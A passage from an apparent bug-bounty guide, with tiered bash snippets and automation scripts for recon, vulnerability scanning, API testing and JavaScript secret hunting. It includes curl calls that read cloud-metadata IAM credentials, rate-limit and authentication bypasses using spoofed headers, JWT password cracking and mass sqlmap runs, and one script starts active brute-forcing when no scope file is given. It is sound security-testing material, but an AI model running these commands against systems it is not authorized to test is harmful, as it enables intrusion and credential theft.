# Analyze for prototype pollution
cat recon/urls/js_files.txt | while read url; do
    curl -s "$url" | grep -E "(prototype|__proto__|constructor)" | tee -a scans/js_prototype_pollution.txt
done
```

### **5.2 API Security Testing**

#### **🔰 Beginner Level:**
```bash
# Basic API enumeration
curl -X GET "https://target.com/api/v1/users" -H "Authorization: Bearer TOKEN" | tee exploits/api_basic.txt
```

#### **🚀 Intermediate Level:**
```bash
# Advanced API testing
# Test different HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    curl -X $method "https://target.com/api/v1/users/123" -H "Authorization: Bearer TOKEN" | tee -a exploits/api_methods.txt
done

# API versioning tests
for version in v1 v2 v3 api/v1 api/v2; do
    curl "https://target.com/$version/users" -H "Authorization: Bearer TOKEN" | tee -a exploits/api_versions.txt
done
```

#### **⚡ Elite Level:**
```bash
# Comprehensive API security testing
# GraphQL testing
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}' | tee exploits/graphql_introspection.txt

# REST API fuzzing
python3 ~/tools/APIFuzzer/APIFuzzer.py -s "https://target.com/swagger.json" -r reports/api_fuzzing.txt

# API rate limiting bypass
for i in {1..1000}; do
    curl -H "X-Forwarded-For: 192.168.1.$((RANDOM % 255))" "https://target.com/api/endpoint" &
    if [ $((i % 50)) -eq 0 ]; then wait; fi
done

# JWT testing
python3 ~/tools/jwt_tool/jwt_tool.py -t "JWT_TOKEN" -C -d ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt
```

### **5.3 Cloud Security Testing**

#### **🔰 Beginner Level:**
```bash
# Basic cloud storage enumeration
curl -s "https://target-bucket.s3.amazonaws.com/" | tee scans/s3_basic.txt
```

#### **🚀 Intermediate Level:**
```bash
# Advanced cloud enumeration
# S3 bucket enumeration
python3 ~/tools/S3Scanner/s3scanner.py -f recon/subdomains/all_subs.txt | tee scans/s3_advanced.txt

# Azure blob enumeration
for sub in $(cat recon/subdomains/all_subs.txt); do
    curl -s "https://$sub.blob.core.windows.net/" | tee -a scans/azure_blobs.txt
done
```

#### **⚡ Elite Level:**
```bash
# Comprehensive cloud security testing
# Multi-cloud enumeration
python3 ~/tools/cloud_enum/cloud_enum.py -k target -l scans/cloud_comprehensive.txt

# AWS metadata service testing
curl -s "http://169.254.169.254/latest/meta-data/" | tee exploits/aws_metadata.txt
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | tee -a exploits/aws_metadata.txt

# Google Cloud metadata
curl -s "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google" | tee exploits/gcp_metadata.txt

# Azure metadata
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" | tee exploits/azure_metadata.txt
```

---

## 📊 **PHASE 6: REPORTING & DOCUMENTATION**

### **6.1 Evidence Collection**

#### **🔰 Beginner Level:**
```bash
# Basic evidence collection
mkdir -p reports/{screenshots,logs,exploits}
cp scans/* reports/logs/
cp exploits/* reports/exploits/
```

#### **🚀 Intermediate Level:**
```bash
# Advanced evidence organization
mkdir -p reports/{critical,high,medium,low,info}/{screenshots,logs,exploits,poc}

# Categorize findings by severity
grep -i "critical\|high" scans/* | tee reports/high_severity.txt
grep -i "medium" scans/* | tee reports/medium_severity.txt
grep -i "low\|info" scans/* | tee reports/low_severity.txt
```

#### **⚡ Elite Level:**
```bash
# Comprehensive reporting with automation
python3 -c "
import json
import os
from datetime import datetime

# Create comprehensive report structure
report = {
    'target': 'target.com',
    'scan_date': datetime.now().isoformat(),
    'methodology': 'OWASP Testing Guide v4.0',
    'findings': [],
    'statistics': {}
}

# Process findings and generate JSON report
with open('reports/comprehensive_report.json', 'w') as f:
    json.dump(report, f, indent=2)
"

# Generate HTML report
python3 ~/tools/report_generator.py -i reports/comprehensive_report.json -o reports/final_report.html
```

---

## 🤖 **ADVANCED AUTOMATION SCRIPTS**

### **Master Bug Hunting Script (All-in-One)**
```bash
#!/bin/bash
# Master Bug Hunting Automation Script - Elite Level
# Usage: ./master_hunt.sh target.com [scope_file]

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
TARGET=$1
SCOPE_FILE=$2
THREADS=50
RATE_LIMIT=150
TIMEOUT=10
WORDLIST_DIR="$HOME/SecLists"
TOOLS_DIR="$HOME/tools"
NUCLEI_TEMPLATES="$HOME/nuclei-templates"

# Logging function
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# Check if target is provided
if [ -z "$TARGET" ]; then
    error "Usage: $0 <target.com> [scope_file]"
    exit 1
fi

# Banner
echo -e "${PURPLE}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║                    🔥 MASTER BUG HUNTER 🔥                   ║
║                  Elite Bug Hunting Automation               ║
║                     Beginner to Elite Level                 ║
╚══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

log "🎯 Target: $TARGET"
log "🚀 Starting comprehensive bug hunting automation..."

# Create directory structure
WORK_DIR="${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$WORK_DIR"/{recon/{subdomains,urls,js,secrets,screenshots},scans/{nuclei,xss,sqli,dirs},exploits,reports,logs}
cd "$WORK_DIR"

# Save configuration
cat > config.txt << EOF
Target: $TARGET
Start Time: $(date)
Threads: $THREADS
Rate Limit: $RATE_LIMIT
Timeout: $TIMEOUT
Scope File: ${SCOPE_FILE:-"None"}
EOF

# Phase 1: Advanced Subdomain Enumeration
log "🔍 Phase 1: Advanced Subdomain Enumeration"
{
    # Passive enumeration with multiple tools
    info "Running passive subdomain enumeration..."
    subfinder -d "$TARGET" -all -silent -o recon/subdomains/subfinder.txt &
    assetfinder --subs-only "$TARGET" | tee recon/subdomains/assetfinder.txt &
    amass enum -passive -d "$TARGET" -o recon/subdomains/amass.txt &
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > recon/subdomains/crt_sh.txt &
    
    # Wait for passive enumeration to complete
    wait
    
    # Combine all results
    cat recon/subdomains/*.txt | sort -u > recon/subdomains/all_subs.txt
    
    # Active enumeration (if scope allows)
    if [ -z "$SCOPE_FILE" ]; then
        warning "No scope file provided, running active enumeration..."
        amass enum -active -d "$TARGET" -brute -w "$WORDLIST_DIR/Discovery/DNS/fierce-hostlist.txt" -o recon/subdomains/amass_active.txt
        cat recon/subdomains/amass_active.txt >> recon/subdomains/all_subs.txt
        sort -u recon/subdomains/all_subs.txt -o recon/subdomains/all_subs.txt
    fi
    
    SUBDOMAIN_COUNT=$(wc -l < recon/subdomains/all_subs.txt)
    log "✅ Found $SUBDOMAIN_COUNT subdomains"
} 2>&1 | tee logs/phase1_subdomains.log

# Phase 2: Live Host Discovery & Technology Detection
log "🎯 Phase 2: Live Host Discovery & Technology Detection"
{
    info "Checking live hosts with comprehensive fingerprinting..."
    cat recon/subdomains/all_subs.txt | httpx -silent -status-code -title -tech-detect -server -content-length -favicon -jarm -asn -threads "$THREADS" -timeout "$TIMEOUT" -o recon/alive_detailed.txt
    
    # Extract clean URLs
    cat recon/alive_detailed.txt | cut -d ' ' -f1 > recon/alive_urls.txt
    
    # Take screenshots
    info "Taking screenshots of live hosts..."
    gowitness file -f recon/alive_urls.txt -P recon/screenshots/ --disable-logging --threads 10
    
    # Port scanning on alive hosts
    info "Scanning ports on live hosts..."
    naabu -list recon/alive_urls.txt -top-ports 1000 -silent -threads "$THREADS" -o recon/open_ports.txt
    
    ALIVE_COUNT=$(wc -l < recon/alive_urls.txt)
    log "✅ Found $ALIVE_COUNT live hosts"
} 2>&1 | tee logs/phase2_discovery.log

# Phase 3: Comprehensive URL Collection
log "🌐 Phase 3: Comprehensive URL Collection"
{
    info "Collecting URLs from multiple sources..."
    
    # Wayback Machine
    cat recon/alive_urls.txt | waybackurls | anew recon/urls/all_urls.txt &
    
    # GAU (Get All URLs)
    echo "$TARGET" | gau --subs --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf,webp,woff2,eot,ttf,otf,mp4,txt | anew recon/urls/all_urls.txt &
    
    # Katana crawler
    cat recon/alive_urls.txt | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault,otx,threatcrowd -threads "$THREADS" | anew recon/urls/all_urls.txt &
    
    wait
    
    # Extract different types of URLs
    cat recon/urls/all_urls.txt | grep "=" | anew recon/urls/params.txt
    cat recon/urls/all_urls.txt | grep -E "\.(js|json)" | anew recon/urls/js_files.txt
    cat recon/urls/all_urls.txt | grep -E "(api|admin|login|auth|dashboard)" | anew recon/urls/sensitive.txt
    
    URL_COUNT=$(wc -l < recon/urls/all_urls.txt)
    PARAM_COUNT=$(wc -l < recon/urls/params.txt 2>/dev/null || echo "0")
    JS_COUNT=$(wc -l < recon/urls/js_files.txt 2>/dev/null || echo "0")
    
    log "✅ Collected $URL_COUNT URLs ($PARAM_COUNT with parameters, $JS_COUNT JS files)"
} 2>&1 | tee logs/phase3_urls.log

# Phase 4: Advanced Vulnerability Scanning
log "🔍 Phase 4: Advanced Vulnerability Scanning"
{
    info "Running comprehensive Nuclei scans..."
    
    # Critical and High severity scan
    nuclei -list recon/alive_urls.txt -t "$NUCLEI_TEMPLATES" -severity critical,high -c "$THREADS" -rl "$RATE_LIMIT" -timeout "$TIMEOUT" -o scans/nuclei/critical_high.txt &
    
    # CVE scan
    nuclei -list recon/alive_urls.txt -t "$NUCLEI_TEMPLATES/cves/" -c "$THREADS" -rl "$RATE_LIMIT" -timeout "$TIMEOUT" -o scans/nuclei/cves.txt &
    
    # Exposure scan
    nuclei -list recon/alive_urls.txt -t "$NUCLEI_TEMPLATES/exposures/" -c "$THREADS" -rl "$RATE_LIMIT" -timeout "$TIMEOUT" -o scans/nuclei/exposures.txt &
    
    # Technology-specific scans
    nuclei -list recon/alive_urls.txt -t "$NUCLEI_TEMPLATES/technologies/" -c "$THREADS" -rl "$RATE_LIMIT" -timeout "$TIMEOUT" -o scans/nuclei/technologies.txt &
    
    wait
    
    # Combine all Nuclei results
    cat scans/nuclei/*.txt > scans/nuclei/all_findings.txt
    
    info "Running XSS scans..."
    if [ -f recon/urls/params.txt ] && [ -s recon/urls/params.txt ]; then
        cat recon/urls/params.txt | dalfox pipe --silence --no-spinner --skip-bav --format json -o scans/xss/dalfox_results.json
    fi
    
    info "Running SQL injection scans..."
    if [ -f recon/urls/params.txt ] && [ -s recon/urls/params.txt ]; then
        sqlmap -m recon/urls/params.txt --batch --level=2 --risk=2 --random-agent --threads=5 --output-dir=scans/sqli/ --flush-session
    fi
    
    NUCLEI_FINDINGS=$(wc -l < scans/nuclei/all_findings.txt 2>/dev/null || echo "0")
    log "✅ Found $NUCLEI_FINDINGS potential vulnerabilities"
} 2>&1 | tee logs/phase4_scanning.log

# Phase 5: Directory & File Discovery
log "📁 Phase 5: Directory & File Discovery"
{
    info "Running directory bruteforcing..."
    
    # Create a function for directory bruteforcing
    bruteforce_dirs() {
        local url=$1
        local output_file="scans/dirs/$(echo "$url" | sed 's|https\?://||g' | tr '/' '_').txt"
        
        # Use different wordlists based on detected technology
        if grep -q "WordPress" recon/alive_detailed.txt; then
            gobuster dir -u "$url" -w "$WORDLIST_DIR/Discovery/Web-Content/CMS/wordpress.fuzz.txt" -t 30 -x php,txt,json,xml,bak -o "$output_file" 2>/dev/null
        elif grep -q "Apache" recon/alive_detailed.txt; then
            gobuster dir -u "$url" -w "$WORDLIST_DIR/Discovery/Web-Content/Apache.fuzz.txt" -t 30 -x php,txt,json,xml,bak -o "$output_file" 2>/dev/null
        else
            gobuster dir -u "$url" -w "$WORDLIST_DIR/Discovery/Web-Content/common.txt" -t 30 -x php,txt,json,xml,bak -o "$output_file" 2>/dev/null
        fi
    }
    
    # Export function for parallel execution
    export -f bruteforce_dirs
    export WORDLIST_DIR
    
    # Run directory bruteforcing in parallel
    cat recon/alive_urls.txt | head -20 | parallel -j 5 bruteforce_dirs {}
    
    # Combine results
    find scans/dirs/ -name "*.txt" -exec cat {} \; > scans/dirs/all_dirs.txt
    
    DIR_COUNT=$(wc -l < scans/dirs/all_dirs.txt 2>/dev/null || echo "0")
    log "✅ Found $DIR_COUNT directories/files"
} 2>&1 | tee logs/phase5_directories.log

# Phase 6: JavaScript Analysis & Secret Extraction
log "📜 Phase 6: JavaScript Analysis & Secret Extraction"
{
    if [ -f recon/urls/js_files.txt ] && [ -s recon/urls/js_files.txt ]; then
        info "Analyzing JavaScript files for secrets and endpoints..."
        
        analyze_js() {
            local js_url=$1
            local js_content
            js_content=$(curl -s "$js_url" --max-time 10)
            
            if [ -n "$js_content" ]; then
                # Extract secrets
                echo "$js_content" | grep -oE '(api_key|apikey|api-key|secret|token|password|pwd|auth|authorization|bearer)["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}' >> recon/secrets/js_secrets.txt
                
                # Extract endpoints
                echo "$js_content" | python3 "$TOOLS_DIR/LinkFinder/linkfinder.py" -i stdin -o cli >> recon/urls/js_endpoints.txt
                
                # Extract URLs
                echo "$js_content" | grep -oE 'https?://[^"'\''<>\s]+' >> recon/urls/js_urls.txt
                
                # Check for DOM XSS sinks
                echo "$js_content" | grep -E "(innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval)" | sed "s|^|$js_url: |" >> recon/js_dom_sinks.txt
            fi
        }
        
        export -f analyze_js
        export TOOLS_DIR
        
        # Analyze JS files in parallel
        cat recon/urls/js_files.txt | head -50 | parallel -j 10 analyze_js {}
        
        # Remove duplicates
        [ -f recon/secrets/js_secrets.txt ] && sort -u recon/secrets/js_secrets.txt -o recon/secrets/js_secrets.txt
        [ -f recon/urls/js_endpoints.txt ] && sort -u recon/urls/js_endpoints.txt -o recon/urls/js_endpoints.txt
        [ -f recon/urls/js_urls.txt ] && sort -u recon/urls/js_urls.txt -o recon/urls/js_urls.txt
        
        SECRET_COUNT=$(wc -l < recon/secrets/js_secrets.txt 2>/dev/null || echo "0")
        ENDPOINT_COUNT=$(wc -l < recon/urls/js_endpoints.txt 2>/dev/null || echo "0")
        
        log "✅ Extracted $SECRET_COUNT potential secrets and $ENDPOINT_COUNT endpoints from JS files"
    else
        warning "No JavaScript files found for analysis"
    fi
} 2>&1 | tee logs/phase6_javascript.log

# Phase 7: Advanced Manual Testing Preparation
log "🎯 Phase 7: Advanced Manual Testing Preparation"
{
    info "Preparing data for manual testing..."
    
    # Create target lists for manual testing
    mkdir -p exploits/{auth,idor,logic,injection}
    
    # Authentication endpoints
    cat recon/urls/all_urls.txt | grep -E "(login|auth|signin|sso|oauth)" | head -20 > exploits/auth/endpoints.txt
    
    # API endpoints for IDOR testing
    cat recon/urls/all_urls.txt | grep -E "api.*/(user|account|profile|order|document)" | grep -E "[0-9]+" | head -50 > exploits/idor/endpoints.txt
    
    # Admin/sensitive endpoints
    cat recon/urls/all_urls.txt | grep -E "(admin|dashboard|panel|manage|config)" | head -20 > exploits/logic/admin_endpoints.txt
    
    # Injection test candidates
    cat recon/urls/params.txt | head -100 > exploits/injection/candidates.txt
    
    info "Manual testing preparation completed"
} 2>&1 | tee logs/phase7_manual_prep.log

# Phase 8: Report Generation
log "📊 Phase 8: Report Generation"
{
    info "Generating comprehensive report..."
    
    # Create HTML report
    cat > reports/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Bug Hunting Report - $TARGET</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; }
        .critical { border-left-color: #e74c3c; }
        .high { border-left-color: #f39c12; }
        .medium { border-left-color: #f1c40f; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { text-align: center; padding: 15px; background: #ecf0f1; border-radius: 5px; }
        .finding { background: #f8f9fa; padding: 10px; margin: 10px 0; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 Bug Hunting Report</h1>
        <h2>Target: $TARGET</h2>
        <p>Generated: $(date)</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <h3>$SUBDOMAIN_COUNT</h3>
            <p>Subdomains</p>
        </div>
        <div class="stat-box">
            <h3>$ALIVE_COUNT</h3>
            <p>Live Hosts</p>
        </div>
        <div class="stat-box">
            <h3>$URL_COUNT</h3>
            <p>URLs Collected</p>
        </div>
        <div class="stat-box">
            <h3>$NUCLEI_FINDINGS</h3>
            <p>Potential Issues</p>
        </div>
    </div>
    
    <div class="section critical">
        <h2>🚨 Critical Findings</h2>
        <div class="finding">
EOF
    
    # Add critical findings to report
    if [ -f scans/nuclei/critical_high.txt ]; then
        grep -i "critical" scans/nuclei/critical_high.txt | head -10 >> reports/index.html || echo "<p>No critical findings detected by automated scans.</p>" >> reports/index.html
    else
        echo "<p>No critical findings detected by automated scans.</p>" >> reports/index.html
    fi
    
    cat >> reports/index.html << EOF
        </div>
    </div>
    
    <div class="section">
        <h2>📋 Summary</h2>
        <ul>
            <li>Subdomains discovered: $SUBDOMAIN_COUNT</li>
            <li>Live hosts identified: $ALIVE_COUNT</li>
            <li>URLs collected: $URL_COUNT</li>
            <li>Parameterized URLs: $PARAM_COUNT</li>
            <li>JavaScript files: $JS_COUNT</li>
            <li>Potential secrets found: $SECRET_COUNT</li>
            <li>Directories/files discovered: $DIR_COUNT</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>🔍 Next Steps for Manual Testing</h2>
        <ul>
            <li>Review authentication endpoints in exploits/auth/</li>
            <li>Test IDOR vulnerabilities using exploits/idor/endpoints.txt</li>
            <li>Analyze admin panels found in exploits/logic/admin_endpoints.txt</li>
            <li>Perform injection testing on exploits/injection/candidates.txt</li>
            <li>Review JavaScript secrets in recon/secrets/js_secrets.txt</li>
        </ul>
    </div>
</body>
</html>
EOF
    
    # Create summary text report
    cat > reports/summary.txt << EOF
=== BUG HUNTING SUMMARY FOR $TARGET ===
Generated: $(date)

STATISTICS:
- Subdomains found: $SUBDOMAIN_COUNT
- Live hosts: $ALIVE_COUNT  
- URLs collected: $URL_COUNT
- Parameterized URLs: $PARAM_COUNT
- JavaScript files: $JS_COUNT
- Potential secrets: $SECRET_COUNT
- Directories/files: $DIR_COUNT
- Nuclei findings: $NUCLEI_FINDINGS

CRITICAL FILES TO REVIEW:
- recon/alive_urls.txt (Live targets)
- recon/urls/params.txt (Injection candidates).
- recon/secrets/js_secrets.txt (Potential secrets)
- scans/nuclei/all_findings.txt (Automated findings)
- exploits/ (Manual testing targets)

NEXT STEPS:
1. Review automated findings in scans/
2. Perform manual testing on endpoints in exploits/
3. Analyze JavaScript files for client-side issues
4. Test business logic flaws
5. Document and report findings

Happy hunting! 🐛🔍
EOF
    
    log "✅ Reports generated in reports/ directory"
} 2>&1 | tee logs/phase8_reporting.log

# Final summary
echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    🎉 HUNTING COMPLETED! 🎉                  ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"

log "🎯 Target: $TARGET"
log "📊 Results Summary:"
log "   • Subdomains: $SUBDOMAIN_COUNT"
log "   • Live Hosts: $ALIVE_COUNT"
log "   • URLs: $URL_COUNT"
log "   • Potential Issues: $NUCLEI_FINDINGS"
log "📁 All results saved in: $WORK_DIR"
log "📋 Open reports/index.html for detailed report"
log "🔍 Review exploits/ directory for manual testing targets"

echo -e "\n${YELLOW}⚠️  Remember: This is automated reconnaissance. Manual testing is required for thorough security assessment.${NC}"
echo -e "${BLUE}📚 Check the workflow documentation for manual testing techniques.${NC}"
```

### **Specialized Automation Scripts**

#### **1. Advanced Subdomain Discovery Script**
```bash
#!/bin/bash
# Advanced Subdomain Discovery with DNS Validation
# Usage: ./subdomain_hunter.sh target.com

TARGET=$1
OUTPUT_DIR="subdomains_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "🔍 Advanced Subdomain Discovery for $TARGET"

# Phase 1: Passive Collection
echo "[+] Phase 1: Passive Collection"
subfinder -d "$TARGET" -all -silent -o "$OUTPUT_DIR/subfinder.txt" &
assetfinder --subs-only "$TARGET" > "$OUTPUT_DIR/assetfinder.txt" &
amass enum -passive -d "$TARGET" -o "$OUTPUT_DIR/amass_passive.txt" &

# Certificate Transparency
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > "$OUTPUT_DIR/crt_sh.txt" &

# Chaos dataset
curl -s "https://chaos-data.projectdiscovery.io/index.json" | jq -r '.[] | select(.URL | contains("'$TARGET'")) | .URL' > "$OUTPUT_DIR/chaos.txt" &

wait

# Combine passive results
cat "$OUTPUT_DIR"/*.txt | sort -u > "$OUTPUT_DIR/passive_all.txt"
PASSIVE_COUNT=$(wc -l < "$OUTPUT_DIR/passive_all.txt")
echo "[✓] Passive collection: $PASSIVE_COUNT subdomains"

# Phase 2: DNS Bruteforcing
echo "[+] Phase 2: DNS Bruteforcing"
puredns bruteforce ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt "$TARGET" --resolvers ~/resolvers.txt > "$OUTPUT_DIR/bruteforce.txt"
BRUTE_COUNT=$(wc -l < "$OUTPUT_DIR/bruteforce.txt")
echo "[✓] Bruteforce: $BRUTE_COUNT new subdomains"

# Phase 3: Permutation
echo "[+] Phase 3: Permutation"
python3 ~/tools/altdns/altdns.py -i "$OUTPUT_DIR/passive_all.txt" -o "$OUTPUT_DIR/altdns.txt" -w ~/SecLists/Discovery/DNS/altdns-words.txt
puredns resolve "$OUTPUT_DIR/altdns.txt" --resolvers ~/resolvers.txt > "$OUTPUT_DIR/altdns_resolved.txt"
PERM_COUNT=$(wc -l < "$OUTPUT_DIR/altdns_resolved.txt")
echo "[✓] Permutation: $PERM_COUNT new subdomains"

# Phase 4: Final Validation
echo "[+] Phase 4: Final Validation"
cat "$OUTPUT_DIR/passive_all.txt" "$OUTPUT_DIR/bruteforce.txt" "$OUTPUT_DIR/altdns_resolved.txt" | sort -u > "$OUTPUT_DIR/all_subdomains.txt"
puredns resolve "$OUTPUT_DIR/all_subdomains.txt" --resolvers ~/resolvers.txt > "$OUTPUT_DIR/final_subdomains.txt"

FINAL_COUNT=$(wc -l < "$OUTPUT_DIR/final_subdomains.txt")
echo "[✓] Final validated subdomains: $FINAL_COUNT"

# Live check
httpx -list "$OUTPUT_DIR/final_subdomains.txt" -silent -status-code -title -o "$OUTPUT_DIR/live_subdomains.txt"
LIVE_COUNT=$(wc -l < "$OUTPUT_DIR/live_subdomains.txt")
echo "[✓] Live subdomains: $LIVE_COUNT"

echo "🎉 Subdomain discovery completed!"
echo "📁 Results saved in: $OUTPUT_DIR/"
```

#### **2. API Security Testing Script**
```bash
#!/bin/bash
# Advanced API Security Testing
# Usage: ./api_hunter.sh target.com

TARGET=$1
API_DIR="api_testing_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$API_DIR"/{discovery,testing,results}

echo "🔍 API Security Testing for $TARGET"

# Phase 1: API Discovery
echo "[+] Phase 1: API Discovery"

# Common API paths
API_PATHS=(
    "/api" "/api/v1" "/api/v2" "/api/v3"
    "/rest" "/rest/api" "/rest/v1"
    "/graphql" "/graphiql"
    "/swagger" "/swagger.json" "/swagger.yaml"
    "/openapi.json" "/openapi.yaml"
    "/docs" "/documentation"
    "/v1" "/v2" "/v3"
)

# Test API paths
for path in "${API_PATHS[@]}"; do
    echo "Testing: https://$TARGET$path"
    curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$path" | grep -E "200|401|403" && echo "https://$TARGET$path" >> "$API_DIR/discovery/api_endpoints.txt"
done

# Extract API endpoints from JavaScript files
echo "[+] Extracting API endpoints from JS files"
curl -s "$TARGET" | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//g' | sed 's/"//g' | while read js_url; do
    if [[ $js_url == /* ]]; then
        js_url="https://$TARGET$js_url"
    fi
    curl -s "$js_url" | grep -oE '"/api/[^"]*"' | sed 's/"//g' | sed "s|^|https://$TARGET|" >> "$API_DIR/discovery/js_api_endpoints.txt"
done

# Phase 2: API Documentation Discovery
echo "[+] Phase 2: API Documentation Discovery"
DOCS_PATHS=(
    "/swagger-ui" "/swagger-ui.html" "/swagger-ui/index.html"
    "/api-docs" "/api/docs" "/docs/api"
    "/redoc" "/rapidoc"
    "/graphql" "/graphiql" "/playground"
)

for doc_path in "${DOCS_PATHS[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$doc_path")
    if [[ $response == "200" ]]; then
        echo "Found API docs: https://$TARGET$doc_path" | tee -a "$API_DIR/discovery/api_docs.txt"
        curl -s "https://$TARGET$doc_path" > "$API_DIR/discovery/$(basename $doc_path).html"
    fi
done

# Phase 3: API Endpoint Testing
echo "[+] Phase 3: API Endpoint Testing"
if [ -f "$API_DIR/discovery/api_endpoints.txt" ]; then
    while read endpoint; do
        echo "Testing endpoint: $endpoint"
        
        # Test different HTTP methods
        for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
            response=$(curl -s -X "$method" "$endpoint" -w "%{http_code}" -o /dev/null)
            echo "$method $endpoint: $response" >> "$API_DIR/testing/method_responses.txt"
        done
        
        # Test for common vulnerabilities
        # IDOR testing
        if [[ $endpoint =~ /[0-9]+$ ]]; then
            original_id=$(echo "$endpoint" | grep -oE '[0-9]+$')
            test_endpoint=$(echo "$endpoint" | sed "s/$original_id$/999999/")
            curl -s "$test_endpoint" -w "%{http_code}" >> "$API_DIR/testing/idor_test.txt"
        fi
        
        # Authentication bypass
        curl -s "$endpoint" -H "X-Forwarded-For: 127.0.0.1" -w "%{http_code}" >> "$API_DIR/testing/auth_bypass.txt"
        
    done < "$API_DIR/discovery/api_endpoints.txt"
fi

# Phase 4: GraphQL Testing
echo "[+] Phase 4: GraphQL Testing"
GRAPHQL_ENDPOINTS=("https://$TARGET/graphql" "https://$TARGET/graphiql" "https://$TARGET/api/graphql")

for gql_endpoint in "${GRAPHQL_ENDPOINTS[@]}"; do
    # Test introspection
    introspection_query='{"query":"query{__schema{types{name}}}"}'
    response=$(curl -s -X POST "$gql_endpoint" -H "Content-Type: application/json" -d "$introspection_query")
    if [[ $response == *"__schema"* ]]; then
        echo "GraphQL introspection enabled: $gql_endpoint" | tee -a "$API_DIR/results/graphql_findings.txt"
        echo "$response" > "$API_DIR/results/graph_schema.json"
    fi
done

# Generate report
echo "[+] Generating API Security Report"
cat > "$API_DIR/results/api_report.txt" << EOF
=== API Security Testing Report ===
Target: $TARGET
Date: $(date)

API Endpoints Discovered:
$(cat "$API_DIR/discovery/api_endpoints.txt" 2>/dev/null | wc -l) endpoints found

Documentation Found:
$(cat "$API_DIR/discovery/api_docs.txt" 2>/dev/null || echo "None")

Security Issues:
- Check method_responses.txt for unusual HTTP method responses
- Check idor_test.txt for potential IDOR vulnerabilities  
- Check auth_bypass.txt for authentication bypass attempts
- Check graphql_findings.txt for GraphQL security issues

Manual Testing Recommendations:
1. Test authentication and authorization
2. Verify input validation
3. Check for rate limiting
4. Test business logic flaws
5. Verify data exposure in responses
EOF

echo "🎉 API testing completed!"
echo "📁 Results saved in: $API_DIR/"
```

#### **3. JavaScript Security Analysis Script**
```bash
#!/bin/bash
# Advanced JavaScript Security Analysis
# Usage: ./js_analyzer.sh target.com

TARGET=$1
JS_DIR="js_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$JS_DIR"/{collection,analysis,secrets,endpoints}

echo "🔍 JavaScript Security Analysis for $TARGET"

# Phase 1: JavaScript File Collection
echo "[+] Phase 1: Collecting JavaScript files"

# Collect from main page
curl -s "https://$TARGET" | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//g' | sed 's/"//g' > "$JS_DIR/collection/main_page_js.txt"

# Collect from Wayback Machine
waybackurls "$TARGET" | grep -E "\.js$" | head -100 > "$JS_DIR/collection/wayback_js.txt"

# Collect from GAU
echo "$TARGET" | gau | grep -E "\.js$" | head -100 > "$JS_DIR/collection/gau_js.txt"

# Combine and clean
cat "$JS_DIR/collection"/*.txt | sort -u > "$JS_DIR/collection/all_js_files.txt"

# Convert relative URLs to absolute
sed -i "s|^/|https://$TARGET/|g" "$JS_DIR/collection/all_js_files.txt"
sed -i "s|^//|https://|g" "$JS_DIR/collection/all_js_files.txt"

JS_COUNT=$(wc -l < "$JS_DIR/collection/all_js_files.txt")
echo "[✓] Collected $JS_COUNT JavaScript files"

# Phase 2: Download and Analyze
echo "[+] Phase 2: Downloading and analyzing JavaScript files"

analyze_js_file() {
    local js_url=$1
    local filename=$(basename "$js_url" | tr '?' '_' | tr '&' '_')
    local js_content
    
    echo "Analyzing: $js_url"
    js_content=$(curl -s "$js_url" --max-time 10)
    
    if [ -n "$js_content" ]; then
        # Save content
        echo "$js_content" > "$JS_DIR/analysis/$filename"
        
        # Extract secrets and API keys
        echo "$js_content" | grep -oE '(api_key|apikey|api-key|secret|token|password|pwd|auth|authorization|bearer|access_token|refresh_token)["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}' | sed "s|^|$js_url: |" >> "$JS_DIR/secrets/api_keys.txt"
        
        # Extract AWS keys
